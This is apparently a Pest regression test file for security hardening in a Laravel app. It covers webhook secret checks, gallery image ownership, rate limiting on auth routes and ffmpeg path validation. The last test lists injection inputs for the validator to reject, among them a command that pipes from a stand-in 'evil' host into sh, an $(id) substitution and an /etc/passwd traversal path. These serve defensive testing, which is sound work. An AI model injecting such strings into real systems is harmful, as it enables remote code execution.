<?php

use App\Models\Gallery;
use App\Models\Image;
use App\Models\Setting;
use App\Models\User;
use App\Services\CCBillService;
use Illuminate\Http\Request;

/*
|--------------------------------------------------------------------------
| Security Hardening — regression tests
|--------------------------------------------------------------------------
*/

test('the CCBill webhook fails closed when no secret is configured', function () {
    Setting::set('ccbill_webhook_secret', '', 'payments', 'string');

    $verified = app(CCBillService::class)->verifyWebhook(
        Request::create('/webhooks/ccbill', 'POST', ['eventType' => 'RenewalSuccess'])
    );

    expect($verified)->toBeFalse();
});

test('the CCBill webhook rejects a wrong secret and accepts the right one', function () {
    Setting::setEncrypted('ccbill_webhook_secret', 's3cret', 'payments');

    $service = app(CCBillService::class);

    expect($service->verifyWebhook(Request::create('/w', 'POST', ['secret' => 'wrong'])))->toBeFalse();
    expect($service->verifyWebhook(Request::create('/w', 'POST', ['secret' => 's3cret'])))->toBeTrue();

    // The header form is preferred, since query strings land in access logs.
    $headerReq = Request::create('/w', 'POST');
    $headerReq->headers->set('X-Ht-Secret', 's3cret');
    expect($service->verifyWebhook($headerReq))->toBeTrue();
});

test('a gallery cannot be built from another users images', function () {
    $owner = User::factory()->create();
    $victimImage = Image::factory()->create(['user_id' => $owner->id]);

    asUser(); // a different user

    $this->post(route('galleries.store'), [
        'title' => 'Stolen Gallery',
        'privacy' => 'public',
        'image_ids' => [$victimImage->id],
    ])->assertSessionHasErrors('image_ids.0');

    expect(Gallery::where('title', 'Stolen Gallery')->exists())->toBeFalse();
});

test('a gallery can be built from the users own images', function () {
    $user = asUser();
    $ownImage = Image::factory()->create(['user_id' => $user->id]);

    $this->post(route('galleries.store'), [
        'title' => 'My Gallery',
        'privacy' => 'public',
        'image_ids' => [$ownImage->id],
    ])->assertSessionHasNoErrors();

    expect(Gallery::where('title', 'My Gallery')->exists())->toBeTrue();
});

test('registration and password reset endpoints are rate limited', function (string $uri) {
    $route = collect(app('router')->getRoutes())->first(
        fn ($r) => $r->uri() === ltrim($uri, '/') && in_array('POST', $r->methods(), true)
    );

    expect($route)->not->toBeNull("POST {$uri} not found");
    expect(collect($route->gatherMiddleware())->contains(fn ($m) => str_starts_with((string) $m, 'throttle:')))
        ->toBeTrue("POST {$uri} is missing a throttle");
})->with([
    '/register',
    '/login',
    '/forgot-password',
    '/reset-password',
]);

test('ffmpeg binary paths with shell metacharacters are rejected', function () {
    $method = new ReflectionMethod(App\Services\FfmpegService::class, 'isSafeBinaryPath');
    $method->setAccessible(true);

    foreach (['/usr/bin/ffmpeg; curl evil|sh', '/usr/bin/ffmpeg $(id)', 'ffmpeg', '/a/../../etc/passwd'] as $bad) {
        expect($method->invoke(null, $bad))->toBeFalse("expected {$bad} to be rejected");
    }

    expect($method->invoke(null, '/usr/bin/ffmpeg'))->toBeTrue();
});
